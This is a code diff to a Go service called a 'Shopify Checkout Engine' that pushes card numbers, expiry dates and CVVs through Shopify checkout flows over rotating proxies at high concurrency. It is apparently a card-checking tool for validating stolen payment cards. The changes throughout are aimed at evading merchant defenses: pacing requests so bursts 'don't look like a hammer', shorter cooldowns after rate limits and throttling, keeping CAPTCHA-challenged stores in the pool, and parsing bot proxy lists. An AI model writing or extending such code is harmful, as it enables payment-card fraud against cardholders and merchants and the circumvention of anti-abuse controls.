@@ -33,7 +33,7 @@ const (
 	GLOBAL_MAX_CONCURRENT = 1500
 	MAX_POLL_ATTEMPTS     = 8
 	POLL_INITIAL_DELAY    = 600 * time.Millisecond
-	POLL_MAX_DELAY        = 2000 * time.Millisecond
+	POLL_MAX_DELAY        = 1200 * time.Millisecond
 	POLL_STEP             = 200 * time.Millisecond
 	PORT_DEFAULT          = "5001"
 	VARIANT_CACHE_TTL     = 10 * time.Minute
@@ -141,6 +141,27 @@ type Metrics struct {
 var metrics Metrics
 var startTime = time.Now()
 
+// Gentle-traffic pacing (ported from the minimal Python engine that charges
+// with fewer defenses triggered): stagger checkout starts >=50ms apart and
+// pause briefly between stages so bursts don't look like a hammer.
+var startGateMu sync.Mutex
+var lastStartUnixNano int64
+
+func admitStart() {
+	startGateMu.Lock()
+	defer startGateMu.Unlock()
+	now := time.Now().UnixNano()
+	if wait := int64(50*time.Millisecond) - (now - atomic.LoadInt64(&lastStartUnixNano)); wait > 0 {
+		time.Sleep(time.Duration(wait))
+		now = time.Now().UnixNano()
+	}
+	atomic.StoreInt64(&lastStartUnixNano, now)
+}
+
+func paceStep() {
+	time.Sleep(time.Duration(50+rand.Intn(100)) * time.Millisecond)
+}
+
 // ==========================================
 // CACHES
 // ==========================================
@@ -167,7 +188,10 @@ var (
 	variantCache sync.Map // baseURL -> variantEntry
 	tokenCache   sync.Map // baseURL -> tokenEntry
 	deadStores   sync.Map // baseURL -> deadEntry
+	variantMiss  sync.Map // baseURL -> time.Time (negative cache: no paid variant)
 )
+
+const VARIANT_MISS_TTL = 60 * time.Second
 
 func cacheLookupVariant(baseURL string) (string, float64, string, bool, bool) {
 	v, ok := variantCache.Load(baseURL)
@@ -352,18 +376,32 @@ func parseProxy(raw string) (*url.URL, error) {
 		}
 	}
 	if !strings.Contains(raw, "://") {
-		parts := strings.Split(raw, ":")
-		switch len(parts) {
-		case 2:
-			raw = scheme + "://" + raw
-		case 4:
-			if _, err := strconv.Atoi(parts[1]); err == nil {
-				raw = fmt.Sprintf("%s://%s:%s@%s:%s", scheme, parts[2], parts[3], parts[0], parts[1])
+		// Space-separated formats first: "user pass host port" (bot DB format),
+		// "host port user pass", and "host port".
+		if fields := strings.Fields(raw); len(fields) == 4 {
+			if _, err := strconv.Atoi(fields[3]); err == nil {
+				raw = fmt.Sprintf("%s://%s:%s@%s:%s", scheme, fields[0], fields[1], fields[2], fields[3])
+			} else if _, err := strconv.Atoi(fields[1]); err == nil {
+				raw = fmt.Sprintf("%s://%s:%s@%s:%s", scheme, fields[2], fields[3], fields[0], fields[1])
 			} else {
-				raw = fmt.Sprintf("%s://%s:%s@%s:%s", scheme, parts[0], parts[1], parts[2], parts[3])
+				raw = fmt.Sprintf("%s://%s:%s@%s:%s", scheme, fields[0], fields[1], fields[2], fields[3])
 			}
-		default:
-			raw = scheme + "://" + raw
+		} else if fields := strings.Fields(raw); len(fields) == 2 {
+			raw = scheme + "://" + fields[0] + ":" + fields[1]
+		} else {
+			parts := strings.Split(raw, ":")
+			switch len(parts) {
+			case 2:
+				raw = scheme + "://" + raw
+			case 4:
+				if _, err := strconv.Atoi(parts[1]); err == nil {
+					raw = fmt.Sprintf("%s://%s:%s@%s:%s", scheme, parts[2], parts[3], parts[0], parts[1])
+				} else {
+					raw = fmt.Sprintf("%s://%s:%s@%s:%s", scheme, parts[0], parts[1], parts[2], parts[3])
+				}
+			default:
+				raw = scheme + "://" + raw
+			}
 		}
 	}
 	return url.Parse(raw)
@@ -626,6 +664,11 @@ func rejectNeedsTermAccept(codes []string) bool {
 const VARIANT_FETCH_QUERY = `query{products(first:50){edges{node{variants(first:50){edges{node{id availableForSale requiresShipping price{amount currencyCode}}}}}}}}`
 
 func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (string, float64, string, bool, error) {
+	// Bound the whole variant hunt: sequential version attempts + homepage scrape
+	// must never burn the 90s request budget (was hitting 90.00s wall).
+	var cancel context.CancelFunc
+	ctx, cancel = context.WithTimeout(ctx, 15*time.Second)
+	defer cancel()
 	reVid := regexp.MustCompile(`ProductVariant/(\d+)`)
 	tokenRe := regexp.MustCompile(`(?i)(?:storefrontAccessToken|accessToken)["']?\s*[:=]\s*["']([a-f0-9]{32})`)
 
@@ -782,8 +825,15 @@ func fetchVariantCached(ctx context.Context, client *http.Client, baseURL string
 		log.Printf("[CACHE HIT] variant for %s", baseURL)
 		return id, price, cur, shipping, nil
 	}
+	if v, ok := variantMiss.Load(baseURL); ok {
+		if ts, ok := v.(time.Time); ok && time.Now().Before(ts) {
+			return "", 0, "", false, fmt.Errorf("no valid paid variant found (cached)")
+		}
+		variantMiss.Delete(baseURL)
+	}
 	id, price, cur, shipping, err := fetchVariant(ctx, client, baseURL)
 	if err != nil {
+		variantMiss.Store(baseURL, time.Now().Add(VARIANT_MISS_TTL))
 		return "", 0, "", false, err
 	}
 	cacheStoreVariant(baseURL, id, price, cur, shipping)
@@ -846,22 +896,26 @@ func updateMetricsAndDead(msg, baseURL string) {
 	case "RATE_LIMITED":
 		atomic.AddInt64(&metrics.RateLimited, 1)
 		atomic.AddInt64(&metrics.TotalFailed, 1)
-		markDeadStore(baseURL, "RATE_LIMITED", 5*time.Minute)
+		markDeadStore(baseURL, "RATE_LIMITED", 90*time.Second)
 	case "CAPTCHA_REQUIRED":
+		// No dead-mark: a challenged store is not a dead store, and marking it
+		// poisons the pool for every subsequent check (bot-side proxy cooldown
+		// already rests the flagged IP). Count only.
 		atomic.AddInt64(&metrics.CaptchaBlocked, 1)
 		atomic.AddInt64(&metrics.TotalFailed, 1)
-		markDeadStore(baseURL, "CAPTCHA_REQUIRED", 15*time.Minute)
 	case "Site is password protected":
 		atomic.AddInt64(&metrics.TotalFailed, 1)
 		markDeadStore(baseURL, "PASSWORD_PROTECTED", 60*time.Minute)
 	case "Throttled":
 		atomic.AddInt64(&metrics.TotalFailed, 1)
-		markDeadStore(baseURL, "THROTTLED", 5*time.Minute)
+		markDeadStore(baseURL, "THROTTLED", 60*time.Second)
 	case "3DS_REQUIRED":
 		atomic.AddInt64(&metrics.ThreeDSCount, 1)
 		atomic.AddInt64(&metrics.TotalFailed, 1)
 	case "STILL_PROCESSING":
 		atomic.AddInt64(&metrics.StillProcessing, 1)
+		atomic.AddInt64(&metrics.TotalFailed, 1)
+	case "CheckpointDenied", "NegotiationResultFailed", "UNPARSEABLE_RESPONSE", "CHECKOUT_SESSION_FAILED", "POLL_TRANSPORT_ERROR":
 		atomic.AddInt64(&metrics.TotalFailed, 1)
 	default:
 		atomic.AddInt64(&metrics.TotalFailed, 1)
@@ -890,6 +944,8 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		res.Proxy = "Dead"
 		return res
 	}
+
+	admitStart()
 
 	client, err := getProxyClient(proxyStr)
 	if err != nil {
@@ -950,8 +1006,42 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		"sec-fetch-user": "?1",
 	}
 
-	body, status, cartHdr, err := doReqFull(ctx, client, "GET", cartURL, cartHeaders, nil)
+	var body []byte
+	var status int
+	var cartHdr http.Header
+	// Cart fetch: every attempt bounded to 12s (never burn 45s on one slow store)
+	{
+		stageCtx, stageCancel := context.WithTimeout(ctx, 12*time.Second)
+		body, status, cartHdr, err = doReqFull(stageCtx, client, "GET", cartURL, cartHeaders, nil)
+		stageCancel()
+	}
+	// Cart retry: transient transport/rate-limit/5xx only (never 404) — 2 extra attempts, 12s stage budget
+	shouldRetryCart := func() bool {
+		if err != nil {
+			return true
+		}
+		if status == 200 || status == 302 || status == 404 {
+			return false
+		}
+		return status == 429 || status == 430 || status == 503 || status >= 500
+	}
+	for cartTry := 0; shouldRetryCart() && cartTry < 2; cartTry++ {
+		time.Sleep(time.Duration(300+cartTry*200) * time.Millisecond)
+		stageCtx, stageCancel := context.WithTimeout(ctx, 12*time.Second)
+		body, status, cartHdr, err = doReqFull(stageCtx, client, "GET", cartURL, cartHeaders, nil)
+		stageCancel()
+	}
 	if err != nil || (status != 200 && status != 302) {
+		// Dead storefront (404/410): distinct verdict, but NEVER dead-mark —
+		// a flagged egress IP also reads as 404, and marking poisons the whole
+		// pool for an hour (every rotation then fast-fails). Audit purges these.
+		if status == 404 || status == 410 {
+			res.Message = "DEAD_STORE:NOT_FOUND"
+			if proxyStr != "" {
+				res.Proxy = "Dead"
+			}
+			return res
+		}
 		res.Message = "Cart permalink failed"
 		if proxyStr != "" {
 			res.Proxy = "Dead"
@@ -960,6 +1050,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	}
 
 	text := string(body)
+	paceStep()
 	checkoutURL := baseURL + "/checkouts/cn/" + getRandStr(32)
 	if loc := extractBetween(text, `<meta http-equiv="refresh" content="0;url=`, `"`); loc != "" {
 		checkoutURL = loc
@@ -1423,6 +1514,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	}
 
 	// Step 5: PCI Tokenization with proxy fallback
+	paceStep()
 	pciPayload, _ := json.Marshal(map[string]interface{}{
 		"credit_card": map[string]interface{}{
 			"number": cc, "month": mes, "year": ano,
@@ -1468,6 +1560,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	}
 
 	// Step 6: Submit
+	paceStep()
 	submitAttemptToken := fmt.Sprintf("%s-%s", attemptToken, getRandStr(11))
 	submitVars := map[string]interface{}{
 		"input": map[string]interface{}{
@@ -1582,7 +1675,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 
 	submitType := fstr(body, "__typename")
 
-	if submitType == "SubmitRejected" {
+	for _rejTry := 0; _rejTry < 2 && submitType == "SubmitRejected"; _rejTry++ {
 		errCodes := []string{}
 		errs := fastExtract(body, "errors")
 		if errs != nil {
@@ -1658,9 +1751,13 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 			submitVars["input"].(map[string]interface{})["taxes"] = map[string]interface{}{
 				"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}},
 			}
-			submitVars["attemptToken"] = fmt.Sprintf("%s-%s", attemptToken, getRandStr(11))
+			submitVars["attemptToken"] = submitAttemptToken
 			submitPayload, _ = json.Marshal(map[string]interface{}{"query": MUTATION_SUBMIT, "variables": submitVars, "operationName": "SubmitForCompletion"})
-			body, _, _ = doReq(ctx, client, "POST", graphqlURL+"?operationName=SubmitForCompletion", headers, bytes.NewReader(submitPayload))
+			body, _, retryErr := doReq(ctx, client, "POST", graphqlURL+"?operationName=SubmitForCompletion", headers, bytes.NewReader(submitPayload))
+			if retryErr != nil {
+				res.Message = "Submit failed"
+				return res
+			}
 			if isCaptchaRequired(body) {
 				res.Message = "CAPTCHA_REQUIRED"
 				return res
@@ -1684,6 +1781,12 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 			if errCode == "" {
 				errCode = fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "__typename")
 			}
+			if errCode == "" {
+				errCode = extractCleanResponse(string(body))
+			}
+			if errCode == "" {
+				errCode = "DECLINED_UNKNOWN"
+			}
 			res.Message = errCode
 			return res
 		}
@@ -1694,12 +1797,19 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		res.Message = "Throttled"
 		return res
 	} else if submitType == "CheckpointDenied" {
-		res.Message = "Checkpoint Denied"
+		res.Message = "CheckpointDenied"
 		return res
 	}
 
 	receiptID := fstr(fastExtract(body, "receipt"), "id")
 	if receiptID == "" {
+		if os.Getenv("DEBUG_FALLBACK") != "0" {
+			sb := string(body)
+			if len(sb) > 600 {
+				sb = sb[:600]
+			}
+			log.Printf("[DBG fallback] submitType=%s base=%s body=%.600s", submitType, baseURL, sb)
+		}
 		res.Message = extractCleanResponse(string(body))
 		return res
 	}
@@ -1714,12 +1824,20 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	for i := 0; i < MAX_POLL_ATTEMPTS; i++ {
 		time.Sleep(pollDelay)
 		body, status, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=PollForReceipt", headers, bytes.NewReader(pollPayload))
-		if err != nil || status == 429 {
+		if err != nil {
+			time.Sleep(300 * time.Millisecond)
+			body, status, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=PollForReceipt", headers, bytes.NewReader(pollPayload))
+			if err != nil {
+				res.Message = "POLL_TRANSPORT_ERROR"
+				return res
+			}
+		}
+		if status == 429 || status == 430 || status == 503 {
 			res.Message = "RATE_LIMITED"
 			return res
 		}
 		if isCaptchaRequired(body) {
-			res.Message = "CARD_DECLINED"
+			res.Message = "CAPTCHA_REQUIRED"
 			return res
 		}
 
@@ -1734,6 +1852,12 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 			errCode := fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "code")
 			if errCode == "" {
 				errCode = fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "__typename")
+			}
+			if errCode == "" {
+				errCode = extractCleanResponse(string(body))
+			}
+			if errCode == "" {
+				errCode = "DECLINED_UNKNOWN"
 			}
 			res.Message = errCode
 			return res
@@ -2147,6 +2271,7 @@ func main() {
 
 	log.Printf("🚀 Shopify Checkout Engine starting on port %s\n", port)
 	log.Printf("⚡ Auto-Variant | SOCKS + HTTP Proxies | %d Concurrent | 1GB RAM Optimized\n", GLOBAL_MAX_CONCURRENT)
+	log.Printf("[BUILD dbg-fallback-v1 fetch15s pace poll8 nocaptcha-dead]")
 	if err := server.ListenAndServe(); err != nil {
 		log.Fatalf("Server crashed: %v", err)
 	}
